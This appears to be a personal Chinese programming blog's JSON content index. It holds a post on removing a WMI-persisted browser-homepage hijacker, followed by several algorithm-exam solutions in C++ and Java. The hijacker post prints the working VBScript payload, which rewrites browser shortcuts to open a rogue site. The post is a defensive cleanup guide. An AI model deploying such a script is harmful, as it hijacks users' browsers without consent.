{"meta":{"title":"ttinch's Blog","subtitle":"不忘初心","description":"初学者的随笔","author":"ttinch","url":"http://yoursite.com"},"pages":[{"title":"","date":"2017-04-03T09:13:30.000Z","updated":"2017-04-03T13:05:12.524Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2017-04-03T09:09:26.000Z","updated":"2017-04-03T13:04:34.270Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"那些年和流氓主页的斗智斗勇","slug":"那些年和流氓主页的斗智斗勇","date":"2017-10-08T10:25:23.000Z","updated":"2017-10-08T12:27:43.651Z","comments":true,"path":"2017/10/08/那些年和流氓主页的斗智斗勇/","link":"","permalink":"http://yoursite.com/2017/10/08/那些年和流氓主页的斗智斗勇/","excerpt":"AdwCleaner广告清除软件，很方便，不过会把桌面版QQ清除。 WMI tool快捷方式中加入网址地址，且手动删除后隔一段时间就被修改适合该方法。 下载WMI tool，之后打开WMI Event Viewer：","text":"AdwCleaner广告清除软件，很方便，不过会把桌面版QQ清除。 WMI tool快捷方式中加入网址地址，且手动删除后隔一段时间就被修改适合该方法。 下载WMI tool，之后打开WMI Event Viewer： 点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目： 在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性： 在Script Text那一栏我们可以看到这段脚本： 12345678910111213141516171819202122232425262728293031323334353637383940On Error Resume Next:Const link = \"http://hao934.com/?r=ggggg&amp;m=a296\":Const link360 = \"http://hao934.com/?r=ggggg&amp;m=a296&amp;s=3\":browsers = \"114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe\":lnkpaths = \"C:\\Users\\Public\\Desktop,C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs,C:\\Users\\Jiayutong\\Desktop,C:\\Users\\Jiayutong\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch,C:\\Users\\Jiayutong\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu,C:\\Users\\Jiayutong\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar,C:\\Users\\Jiayutong\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\":browsersArr = split(browsers,\",\"):Set oDic = CreateObject(\"scripting.dictionary\"):For Each browser In browsersArr: oDic.Add LCase(browser), browser:Next:lnkpathsArr = split(lnkpaths,\",\"):Set oFolders = CreateObject(\"scripting.dictionary\"):For Each lnkpath In lnkpathsArr: oFolders.Add lnkpath, lnkpath:Next:Set fso = CreateObject(\"Scripting.Filesystemobject\"):Set WshShell = CreateObject(\"Wscript.Shell\"):For Each oFolder In oFolders: If fso.FolderExists(oFolder) Then: For Each file In fso.GetFolder(oFolder).Files: If LCase(fso.GetExtensionName(file.Path)) = \"lnk\" Then: Set oShellLink = WshShell.CreateShortcut(file.Path): path = oShellLink.TargetPath: name = fso.GetBaseName(path) &amp; \".\" &amp; fso.GetExtensionName(path): If oDic.Exists(LCase(name)) Then: If LCase(name) = LCase(\"360se.exe\") Then: oShellLink.Arguments = link360: Else: oShellLink.Arguments = link: End If: If file.Attributes And 1 Then: file.Attributes = file.Attributes - 1: End If: oShellLink.Save: End If: End If: Next: End If:Next: 终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。 查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name=”VBScriptKids_filter”右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs里改掉。","categories":[{"name":"软件","slug":"软件","permalink":"http://yoursite.com/categories/软件/"},{"name":"流氓软件","slug":"软件/流氓软件","permalink":"http://yoursite.com/categories/软件/流氓软件/"}],"tags":[]},{"title":"贪心算法","slug":"贪心算法","date":"2017-07-23T23:15:46.000Z","updated":"2017-10-08T12:13:26.230Z","comments":true,"path":"2017/07/24/贪心算法/","link":"","permalink":"http://yoursite.com/2017/07/24/贪心算法/","excerpt":"题目1437：To Fill or Not to Fill题目描述：With highways available, driving a car from Hangzhou to any other city is easy. But since the tank capacity of a car is limited, we have to find gas stations on the way from time to time. Different gas station may give different price. You are asked to carefully design the cheapest route to go.","text":"题目1437：To Fill or Not to Fill题目描述：With highways available, driving a car from Hangzhou to any other city is easy. But since the tank capacity of a car is limited, we have to find gas stations on the way from time to time. Different gas station may give different price. You are asked to carefully design the cheapest route to go. 输入：For each case, the first line contains 4 positive numbers: Cmax (&lt;= 100), the maximum capacity of the tank; D (&lt;=30000), the distance between Hangzhou and the destination city; Davg (&lt;=20), the average distance per unit gas that the car can run; and N (&lt;= 500), the total number of gas stations. Then N lines follow, each contains a pair of non-negative numbers: Pi, the unit gas price, and Di (&lt;=D), the distance between this station and Hangzhou, for i=1,…N. All the numbers in a line are separated by a space. 输出：For each test case, print the cheapest price in a line, accurate up to 2 decimal places. It is assumed that the tank is empty at the beginning. If it is impossible to reach the destination, print “The maximum travel distance = X” where X is the maximum possible distance the car can run, accurate up to 2 decimal places. 样例输入：50 1300 12 86.00 12507.00 6007.00 1507.10 07.20 2007.50 4007.30 10006.85 30050 1300 12 27.10 07.00 600 样例输出：749.17The maximum travel distance = 1200.00 代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include&lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;algorithm&gt;using namespace std;struct station &#123; double price; int dis; bool operator &lt; (const station &amp;A) const &#123; return dis &lt; A.dis; &#125;&#125;;station sta[501];int main() &#123; int cmax, d, davg, n; int nowP, next; double ans, nowC; while (cin &gt;&gt; cmax &gt;&gt; d &gt;&gt; davg &gt;&gt; n) &#123; for (int i = 0; i &lt; n; i++) cin &gt;&gt; sta[i].price &gt;&gt; sta[i].dis; sta[n].price = 0; sta[n].dis = d; sort(sta, sta + n + 1); if (sta[0].dis &gt; 0) &#123; cout &lt;&lt; \"The maximum travel distance = 0.00\" &lt;&lt; endl; continue; &#125; nowP = 0; ans = 0; nowC = 0; while (1) &#123; if (nowP == n) break; if (sta[nowP + 1].dis - sta[nowP].dis &gt; cmax*davg) &#123; ans = -1; break; &#125; int t = nowP; next = nowP; // 查找最近的价格比当前节点便宜的加油站 while (sta[t].dis - sta[nowP].dis &lt;= cmax*davg&amp;&amp;t &lt;= n) &#123; if (sta[t].price &lt; sta[nowP].price) &#123; next = t; break; &#125; t++; &#125; if (next &gt; nowP) &#123; ans += sta[nowP].price*(sta[next].dis - sta[nowP].dis - nowC*davg) / double(davg); nowC = 0; nowP = next; continue; &#125; // 可达范围内没有更便宜的节点，则寻找除当前节点外更便宜的节点 double p = 100000000; for (int i = nowP + 1; i &lt; t; i++) &#123; if (sta[i].price &lt; p) &#123; next = i; p = sta[i].price; &#125; &#125; ans += sta[nowP].price*(cmax - nowC); nowC = cmax - (sta[next].dis - sta[nowP].dis) / double(davg); nowP = next; &#125; if (ans == -1) cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; \"The maximum travel distance = \" &lt;&lt; double(sta[nowP].dis + cmax*davg) &lt;&lt; endl; else cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; ans &lt;&lt; endl; &#125;&#125;","categories":[{"name":"ACM算法","slug":"ACM算法","permalink":"http://yoursite.com/categories/ACM算法/"},{"name":"贪心算法","slug":"ACM算法/贪心算法","permalink":"http://yoursite.com/categories/ACM算法/贪心算法/"}],"tags":[{"name":"九度OJ","slug":"九度OJ","permalink":"http://yoursite.com/tags/九度OJ/"},{"name":"贪心算法","slug":"贪心算法","permalink":"http://yoursite.com/tags/贪心算法/"}]},{"title":"Jobdu 大杂烩","slug":"jobdu","date":"2017-05-05T14:28:19.000Z","updated":"2017-10-08T12:28:12.648Z","comments":true,"path":"2017/05/05/jobdu/","link":"","permalink":"http://yoursite.com/2017/05/05/jobdu/","excerpt":"1202:排序题目描述：对输入的n个数进行排序并输出。 输入：输入的第一行包括一个整数n(1&lt;=n&lt;=100)。 接下来的一行包括n个整数。 输出：可能有多组测试数据，对于每组数据，将排序后的n个整数输出，每个数后面都有一个空格。 每组测试数据的结果占一行。","text":"1202:排序题目描述：对输入的n个数进行排序并输出。 输入：输入的第一行包括一个整数n(1&lt;=n&lt;=100)。 接下来的一行包括n个整数。 输出：可能有多组测试数据，对于每组数据，将排序后的n个整数输出，每个数后面都有一个空格。 每组测试数据的结果占一行。 样例输入：41 4 3 2 样例输出：1 2 3 4 代码：12345678910111213141516171819202122232425#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int main()&#123; int n,i; int a[100]; while(cin&gt;&gt;n)&#123; for(i=0;i&lt;n;i++) cin&gt;&gt;a[i]; sort(a,a+n); for(i=0;i&lt;n;i++) cout&lt;&lt;a[i]&lt;&lt;\" \"; cout&lt;&lt;endl; &#125;&#125;/************************************************************** Problem: 1202 User: ttinch Language: C++ Result: Accepted Time:50 ms Memory:1520 kb****************************************************************/ 1061:成绩排序题目描述：有N个学生的数据，将学生数据按成绩高低排序，如果成绩相同则按姓名字符的字母序排序，如果姓名的字母序也相同则按照学生的年龄排序，并输出N个学生排序后的信息。 输入：测试数据有多组，每组输入第一行有一个整数N（N&lt;=1000），接下来的N行包括N个学生的数据。 每个学生的数据包括姓名（长度不超过100的字符串）、年龄（整形数）、成绩（小于等于100的正数）。 输出：将学生信息按成绩进行排序，成绩相同的则按姓名的字母序进行排序。 然后输出学生信息，按照如下格式： 姓名 年龄 成绩 样例输入：3abc 20 99bcd 19 97bed 20 97 样例输出：bcd 19 97bed 20 97abc 20 99 提示：学生姓名的字母序区分字母的大小写，如A要比a的字母序靠前(因为A的ASC码比a的ASC码要小)。 代码：123456789101112131415161718192021222324252627282930313233343536373839#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;struct student&#123; string name; int age; int score;&#125;;bool cmp(student s1,student s2)&#123; if(s1.score!=s2.score) return s1.score&lt;s2.score; if(s1.name!=s2.name) return s1.name&lt;s2.name; return s1.age&lt;s2.age;&#125;int main()&#123; int n,i; student s[1000]; while(cin&gt;&gt;n)&#123; for(i=0;i&lt;n;i++) cin&gt;&gt;s[i].name&gt;&gt;s[i].age&gt;&gt;s[i].score; stable_sort(s,s+n,cmp); for(i=0;i&lt;n;i++) cout&lt;&lt;s[i].name&lt;&lt;\" \"&lt;&lt;s[i].age&lt;&lt;\" \"&lt;&lt;s[i].score&lt;&lt;endl; &#125;&#125;/************************************************************** Problem: 1061 User: ttinch Language: C++ Result: Accepted Time:620 ms Memory:1528 kb****************************************************************/ c++结构体运算符重载1234567891011121314struct student&#123; string name; int age; int score; bool operator &lt; (const student s) const&#123; if(score!=s.score) return score&lt;s.score; if(name!=s.name) return name&lt;s.name; return age&lt;s.age; &#125;&#125;;stable_sort(s,s+n); 1185:特殊排序题目描述：输入一系列整数，将其中最大的数挑出，并将剩下的数进行排序。 输入：输入第一行包括1个整数N，1&lt;=N&lt;=1000，代表输入数据的个数。 接下来的一行有N个整数。 输出：可能有多组测试数据，对于每组数据， 第一行输出一个整数，代表N个整数中的最大值，并将此值从数组中去除，将剩下的数进行排序。 第二行将排序的结果输出。 样例输入：41 3 4 2 样例输出：41 2 3 提示：如果数组中只有一个数，当第一行将其输出后，第二行请输出”-1”。 代码：12345678910111213141516171819202122232425262728293031#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int main()&#123; int n; int a[1000]; while(cin&gt;&gt;n)&#123; for(int i=0;i&lt;n;i++) cin&gt;&gt;a[i]; if(n==1)&#123; cout&lt;&lt;a[0]&lt;&lt;endl; cout&lt;&lt;-1&lt;&lt;endl; &#125; else&#123; sort(a,a+n); cout&lt;&lt;a[n-1]&lt;&lt;endl; for(int i=0;i&lt;n-2;i++) cout&lt;&lt;a[i]&lt;&lt;\" \"; cout&lt;&lt;a[n-2]&lt;&lt;endl; &#125; &#125;&#125;/************************************************************** Problem: 1185 User: ttinch Language: C++ Result: Accepted Time:50 ms Memory:1520 kb****************************************************************/ 1023:EXCEL排序题目描述： Excel可以对一组纪录按任意指定列排序。现请你编写程序实现类似功能。 对每个测试用例，首先输出1行“Case i:”，其中 i 是测试用例的编号（从1开始）。随后在 N 行中输出按要求排序后的结果，即：当 C=1 时，按学号递增排序；当 C=2时，按姓名的非递减字典序排序；当 C=3时，按成绩的非递减排序。当若干学生具有相同姓名或者相同成绩时，则按他们的学号递增排序。 输入： 测试输入包含若干测试用例。每个测试用例的第1行包含两个整数 N (N&lt;=100000) 和 C，其中 N 是纪录的条数，C 是指定排序的列号。以下有N行，每行包含一条学生纪录。每条学生纪录由学号（6位数字，同组测试中没有重复的学号）、姓名（不超过8位且不包含空格的字符串）、成绩（闭区间[0, 100]内的整数）组成，每个项目间用1个空格隔开。当读到 N=0 时，全部输入结束，相应的结果不要输出。 输出： 对每个测试用例，首先输出1行“Case i:”，其中 i 是测试用例的编号（从1开始）。随后在 N 行中输出按要求排序后的结果，即：当 C=1 时，按学号递增排序；当 C=2时，按姓名的非递减字典序排序；当 C=3时，按成绩的非递减排序。当若干学生具有相同姓名或者相同成绩时，则按他们的学号递增排序。 样例输入： 3 1000007 James 85000010 Amy 90000001 Zoe 604 2000007 James 85000010 Amy 90000001 Zoe 60000002 James 984 3000007 James 85000010 Amy 90000001 Zoe 60000002 James 900 0 样例输出： Case 1:000001 Zoe 60000007 James 85000010 Amy 90Case 2:000010 Amy 90000002 James 98000007 James 85000001 Zoe 60Case 3:000001 Zoe 60000007 James 85000002 James 90000010 Amy 90 代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;struct student&#123; string number; string name; int score;&#125;;bool cmp1(student s1,student s2)&#123; return s1.number&lt;s2.number;&#125;bool cmp2(student s1,student s2)&#123; if(s1.name!=s2.name) return s1.name&lt;s2.name; return s1.number&lt;s2.number;&#125;bool cmp3(student s1,student s2)&#123; if(s1.score!=s2.score) return s1.score&lt;s2.score; return s1.number&lt;s2.number;&#125;int main()&#123; int n,c; int m=0; student s[100000]; while(cin&gt;&gt;n&gt;&gt;c)&#123; if(n==0) break; m++; for(int i=0;i&lt;n;i++) cin&gt;&gt;s[i].number&gt;&gt;s[i].name&gt;&gt;s[i].score; if(c==1) stable_sort(s,s+n,cmp1); else if(c==2) stable_sort(s,s+n,cmp2); else stable_sort(s,s+n,cmp3); cout&lt;&lt;\"Case \"&lt;&lt;m&lt;&lt;\":\"&lt;&lt;endl; for(int i=0;i&lt;n;i++) cout&lt;&lt;s[i].number&lt;&lt;\" \"&lt;&lt;s[i].name&lt;&lt;\" \"&lt;&lt;s[i].score&lt;&lt;endl; &#125;&#125;/************************************************************** Problem: 1023 User: ttinch Language: C++ Result: Accepted Time:780 ms Memory:5868 kb****************************************************************/ 1054:字符串内排序题目描述：输入一个字符串，长度小于等于200，然后将输出按字符顺序升序排序后的字符串。 输入：测试数据有多组，输入字符串。 输出：对于每组输入,输出处理后的结果。 样例输入：bacd 样例输出：abcd 代码：12345678910111213141516171819#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int main()&#123; string s; while(cin&gt;&gt;s)&#123; sort(s.begin(),s.end()); cout&lt;&lt;s&lt;&lt;endl; &#125;&#125;/************************************************************** Problem: 1054 User: ttinch Language: C++ Result: Accepted Time:780 ms Memory:5868 kb****************************************************************/","categories":[{"name":"研究生机试备战之旅","slug":"研究生机试备战之旅","permalink":"http://yoursite.com/categories/研究生机试备战之旅/"}],"tags":[{"name":"字符串与数字的转换","slug":"字符串与数字的转换","permalink":"http://yoursite.com/tags/字符串与数字的转换/"}]},{"title":"C++容器总结","slug":"c++_container","date":"2017-05-05T13:17:44.000Z","updated":"2017-10-08T12:28:35.266Z","comments":true,"path":"2017/05/05/c++_container/","link":"","permalink":"http://yoursite.com/2017/05/05/c++_container/","excerpt":"","text":"","categories":[{"name":"研究生机试备战之旅","slug":"研究生机试备战之旅","permalink":"http://yoursite.com/categories/研究生机试备战之旅/"}],"tags":[{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"},{"name":"容器","slug":"容器","permalink":"http://yoursite.com/tags/容器/"}]},{"title":"排序算法总结","slug":"sort","date":"2017-05-04T13:45:12.000Z","updated":"2017-10-08T12:28:30.923Z","comments":true,"path":"2017/05/04/sort/","link":"","permalink":"http://yoursite.com/2017/05/04/sort/","excerpt":"冒泡排序","text":"冒泡排序 选择排序插入排序 归并排序堆排序快速排序","categories":[{"name":"研究生机试备战之旅","slug":"研究生机试备战之旅","permalink":"http://yoursite.com/categories/研究生机试备战之旅/"}],"tags":[{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"},{"name":"排序","slug":"排序","permalink":"http://yoursite.com/tags/排序/"}]},{"title":"Jobdu 1036-1044（2007-2008年上海交通大学计算机研究生机试真题）","slug":"jobdu1036-1044","date":"2017-04-13T12:37:13.000Z","updated":"2017-10-08T12:26:12.859Z","comments":true,"path":"2017/04/13/jobdu1036-1044/","link":"","permalink":"http://yoursite.com/2017/04/13/jobdu1036-1044/","excerpt":"注：以下题目来源于九度 1036:Old Bill题目描述：Among grandfather’s papers a bill was found. 72 turkeys $679 The first and the last digits of the number that obviously represented the total price of those turkeys are replaced here by blanks (denoted _), for they are faded and are illegible. What are the two faded digits and what was the price of one turkey? We want to write a program that solves a general version of the above problem. N turkeys $XYZ","text":"注：以下题目来源于九度 1036:Old Bill题目描述：Among grandfather’s papers a bill was found. 72 turkeys $679 The first and the last digits of the number that obviously represented the total price of those turkeys are replaced here by blanks (denoted _), for they are faded and are illegible. What are the two faded digits and what was the price of one turkey? We want to write a program that solves a general version of the above problem. N turkeys $XYZThe total number of turkeys, N, is between 1 and 99, including both. The total price originally consisted of five digits, but we can see only the three digits in the middle. We assume that the first digit is nonzero, that the price of one turkeys is an integer number of dollars, and that all the turkeys cost the same price. Given N, X, Y, and Z, write a program that guesses the two faded digits and the original price. In case that there is more than one candidate for the original price, the output should be the most expensive one. That is, the program is to report the two faded digits and the maximum price per turkey for the turkeys. 输入：The first line of the input file contains an integer N (0&lt;N&lt;100), which represents the number of turkeys. In the following line, there are the three decimal digits X, Y, and Z., separated by a space, of the original price $XYZ. 输出：For each case, output the two faded digits and the maximum price per turkey for the turkeys. 样例输入：726 7 952 3 7780 0 5 样例输出：3 2 5119 5 184750 代码：123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;int main()&#123; int n, x, y, z; int first, last; int price, total; int i, j; while (cin &gt;&gt; n &gt;&gt; x &gt;&gt; y &gt;&gt; z)&#123; for (i = 9; i &gt; 0; i--) for (j = 9; j &gt;= 0; j--)&#123; total = i*10000+x*1000+y*100+z*10+j; if (total%n == 0)&#123; price = total/n; goto breakLoop; &#125; &#125; breakLoop: if(i == 0)&#123; cout &lt;&lt; i &lt;&lt;endl; continue; &#125; cout &lt;&lt; i &lt;&lt; \" \" &lt;&lt; j &lt;&lt; \" \" &lt;&lt; price &lt;&lt;endl; &#125;&#125; 1037:Powerful Calculator题目描述：Today, facing the rapid development of business, SJTU recognizes that more powerful calculator should be studied, developed and appeared in future market shortly. SJTU now invites you attending such amazing research and development work. In most business applications, the top three useful calculation operators are Addition (+), Subtraction (-) and Multiplication (×) between two given integers. Normally, you may think it is just a piece of cake. However, since some integers for calculation in business application may be very big, such as the GDP of the whole world, the calculator becomes harder to develop. For example, if we have two integers 20 000 000 000 000 000 and 4 000 000 000 000 000, the exact results of addition, subtraction and multiplication are: 20000000000000000 + 4000000000000000 = 24 000 000 000 000 00020000000000000000 - 4000000000000000 = 16 000 000 000 000 00020000000000000000 × 4000000000000000 = 80 000 000 000 000 000 000 000 000 000 000 Note: SJTU prefers the exact format of the results rather than the float format or scientific remark format. For instance, we need “24000000000000000” rather than 2.4×10^16. As a programmer in SJTU, your current task is to develop a program to obtain the exact results of the addition (a + b), subtraction (a - b) and multiplication (a × b) between two given integers a and b. 输入：Each case consists of two separate lines where the first line gives the integer a and the second gives b (|a| &lt;10^400 and |b| &lt; 10^400). 输出：For each case, output three separate lines showing the exact results of addition (a + b), subtraction (a - b) and multiplication (a × b) of that case, one result per lines. 样例输入：200000000000000004000000000000000 样例输出：240000000000000001600000000000000080000000000000000000000000000000 代码：java 大数处理很方便，内置函数 12345678910111213141516import java.util.Scanner; import java.math.BigInteger; public class Main&#123; public static void main(String[] args)&#123; Scanner in=new Scanner(System.in); while(in.hasNext())&#123; BigInteger a=in.nextBigInteger(); BigInteger b=in.nextBigInteger(); System.out.println(a.add(b)); System.out.println(a.subtract(b)); System.out.println(a.multiply(b)); &#125; in.close(); &#125; &#125; c++处理大数运算——加法、减法、乘法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156#include &lt;iostream&gt;#include &lt;sstream&gt;#include &lt;stdlib.h&gt;using namespace std;// 同号加法，输入不计入符号，同为正string add(string str1,string str2)&#123; int len1, len2; string str3; int carry=0, n1, n2; if(str1.length()&lt;str2.length())&#123; str3 = str1; str1 = str2; str2 = str3; &#125; len1 = str1.length(); len2 = str2.length(); str3 = \"\"; for(int i=0;i&lt;len1-len2;i++)&#123; str3 += '0'; &#125; str2 = str3+str2; str3 = \"\"; for(int i=len1-1;i&gt;=0;i--)&#123; n1 = str1[i]-'0'; n2 = str2[i]-'0'; str3 = char((n1+n2+carry)%10+int('0'))+str3; carry = (n1+n2+carry)/10; &#125; if(carry&gt;0) str3 = char(carry+int('0'))+str3; return str3;&#125;// 减法，大数减小数，输入不计符号，均为正数string subtract(string str1,string str2)&#123; int len1, len2; string str3; int carry=0, n1, n2, n; len1 = str1.length(); len2 = str2.length(); str3 = \"\"; for(int i=0;i&lt;len1-len2;i++)&#123; str3 += '0'; &#125; str2 = str3+str2; str3 = \"\"; for(int i=len1-1;i&gt;=0;i--)&#123; n1 = str1[i]-'0'; n2 = str2[i]-'0'; if(n1-n2-carry&lt;0)&#123; n = 10+n1-n2-carry; carry = 1; &#125; else&#123; n = n1-n2-carry; carry = 0; &#125; str3 = char(n+int('0'))+str3; &#125; while(str3[0]=='0') str3.erase(0,1); if(str3==\"\") str3 = \"0\"; return str3;&#125;// 加法的四种情况string add_all(string str1,string str2)&#123; if((str1[0]=='-'&amp;&amp;str2[0]=='-'))&#123; str1.erase(0,1); str2.erase(0,1); return \"-\"+add(str1,str2); &#125;else if((str1[0]!='-'&amp;&amp;str2[0]!='-')) return add(str1,str2); else if((str1[0]=='-'&amp;&amp;str2[0]!='-'))&#123; str1.erase(0,1); if(str1.length()&gt;str2.length()) return \"-\"+subtract(str1,str2); else if(str1.length()&lt;str2.length()) return subtract(str2,str1); else&#123; if(str2&gt;=str1) return subtract(str2,str1); else return \"-\"+subtract(str1,str2); &#125; &#125; else if((str1[0]!='-'&amp;&amp;str2[0]=='-'))&#123; str2.erase(0,1); if(str1.length()&gt;str2.length()) return subtract(str1,str2); else if(str1.length()&lt;str2.length()) return \"-\"+subtract(str2,str1); else&#123; if(str1&gt;=str2) return subtract(str1,str2); else return \"-\"+subtract(str2,str1); &#125; &#125;&#125;// 减法的多种情况string subtract_all(string str1,string str2)&#123; if(str2[0]=='-') str2.erase(0,1); else str2 = \"-\"+str2; return add_all(str1,str2);&#125;// 一个数乘以一个个位数string mutiply_simple(string str1,char str2)&#123; int n1, n2 = str2-'0'; int len1 = str1.length(); string str3 = \"\"; for(int i = 0;i&lt;n2;i++) str3 = add(str3,str1); return str3;&#125;// 乘法string mutiply(string str1, string str2)&#123; int len1, len2; string str3 = \"\"; string symbol = \"\"; if((str1[0]=='-'&amp;&amp;str2[0]=='-'))&#123; str1.erase(0,1); str2.erase(0,1); &#125;else if((str1[0]=='-'&amp;&amp;str2[0]!='-'))&#123; str1.erase(0,1); symbol = \"-\"; &#125; else if((str1[0]!='-'&amp;&amp;str2[0]=='-'))&#123; str2.erase(0,1); symbol = \"-\"; &#125; len1 = str1.length(); len2 = str2.length(); for(int i=len2-1;i&gt;=0;i--)&#123; str3 = add(str3,mutiply_simple(str1,str2[i])+string(len2-1-i,'0')); &#125; while(str3[0]=='0') str3.erase(0,1); if(str3==\"\") str3 = \"0\"; else str3 = symbol+str3; return str3;&#125;int main()&#123; string str1, str2; while(cin &gt;&gt; str1 &gt;&gt; str2)&#123; cout &lt;&lt; add_all(str1,str2) &lt;&lt; endl; cout &lt;&lt; subtract_all(str1,str2) &lt;&lt; endl; cout &lt;&lt; mutiply(str1,str2) &lt;&lt; endl; &#125;&#125; 1038:Sum of Factorials题目描述：John von Neumann, b. Dec. 28, 1903, d. Feb. 8, 1957, was a Hungarian-American mathematician who made important contributions to the foundations of mathematics, logic, quantum physics, meteorology, science, computers, and game theory. He was noted for a phenomenal memory and the speed with which he absorbed ideas and solved problems. In 1925 he received a B.S. diploma in chemical engineering from Zurich Institute and in 1926 a Ph.D. in mathematics from the University of Budapest, His Ph.D. dissertation on set theory was an important contributions to the subject. At the age of 20, von Neumann proposed a new definition of ordinal numbers that was universally adopted. While still in his twenties, he made many contributions in both pure and applied mathematics that established him as a mathematician of unusual depth. His Mathematical Foundation of Quantum Mechanics (1932) built a solid framework for the new scientific discipline. During this time he also proved the mini-max theorem of GAME THEORY. He gradually expanded his work in game theory, and with coauthor Oskar Morgenstern he wrote Theory of Games and Economic Behavior (1944). There are some numbers which can be expressed by the sum of factorials. For example 9, 9 = 1! + 2! + 3! . Dr. von Neumann was very interested in such numbers. So, he gives you a number n, and wants you to tell whether or not the number can be expressed by the sum of some factorials. Well, it is just a piece of case. For a given n, you will check if there are some xi, and let n equal to Σ1&lt;=i&lt;=txi!. (t≥1, xi≥0, xi = xj &lt;==&gt; i = j). If the answer is yes, say “YES”; otherwise, print out “NO”. 输入：You will get a non-negative integer n (n≤1,000,000) from input file. 输出：For the n in the input file, you should print exactly one word (“YES” or “NO”) in a single line. No extra spaces are allowed. 样例输入：92 样例输出：YESYES 代码：9! = 36288010! = 3628800n≤1,000,000,最大考虑91！+2！+……+n!&lt;(n+1)!=(n+1)*n! 题目要求n为非负整数，不知n=0时应该是yes还是no，但最后结果是否考虑该项都可通过 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;int factorial(int n)&#123; if(n==0) return 1; else return n*factorial(n-1);&#125;int main()&#123; int n; int a[10],i; for(i=0;i&lt;10;i++) a[i] = factorial(i); while(cin&gt;&gt;n)&#123; if(n==0)&#123; cout&lt;&lt;\"NO\"&lt;&lt;endl; continue; &#125; for(i=9;i&gt;=0;i--)&#123; if(a[i]&lt;=n) n = n-a[i]; &#125; if(n==0) cout&lt;&lt;\"YES\"&lt;&lt;endl; else cout&lt;&lt;\"NO\"&lt;&lt;endl; &#125;&#125; 1039:Zero-complexity Transposition题目描述：You are given a sequence of integer numbers. Zero-complexity transposition of the sequence is the reverse of this sequence. Your task is to write a program that prints zero-complexity transposition of the given sequence. 输入：For each case, the first line of the input file contains one integer n-length of the sequence (0 ＜ n ≤ 10 000). The second line contains n integers numbers-a1, a2, …, an (-1 000 000 000 000 000 ≤ ai ≤ 1 000 000 000 000 000). 输出：For each case, on the first line of the output file print the sequence in the reverse order. 样例输入：5-3 4 6 -8 9 样例输出：9 -8 6 4 -3 代码：注意输出格式，最后一个数输出后没有空格 注意数据范围 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;stack&gt;using namespace std;int main()&#123; long long int n,temp; stack&lt;long long int&gt; s; while(cin&gt;&gt;n)&#123; for(int i=0;i&lt;n;i++)&#123; cin&gt;&gt;temp; s.push(temp); &#125; for(int i=0;i&lt;n-1;i++)&#123; cout&lt;&lt;s.top()&lt;&lt;\" \"; s.pop(); &#125; cout&lt;&lt;s.top()&lt;&lt;endl; s.pop(); &#125;&#125; 1040:Prime Number题目描述：Output the k-th prime number. 输入：k≤10000 输出：The k-th prime number. 样例输入：37 样例输出：517 代码：注意数组范围，int k[10000] 最大为k[9999] 或者申请的时候可以多申请一些空间 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;stack&gt;#include &lt;math.h&gt;using namespace std;// 判断是否时素数，是返回1，不是返回0int prime(int n)&#123; for(int i=2;i&lt;=sqrt(n);i++)&#123; if(n%i==0) return 0; &#125; return 1;&#125;int main()&#123; long int k[10000]; long int i=2,n=0; int m; while(n&lt;=9999)&#123; if(prime(i)==1)&#123; k[n]=i; n++; &#125; i++; &#125; while(cin&gt;&gt;m) cout&lt;&lt;k[m-1]&lt;&lt;endl;&#125; 1041:Simple 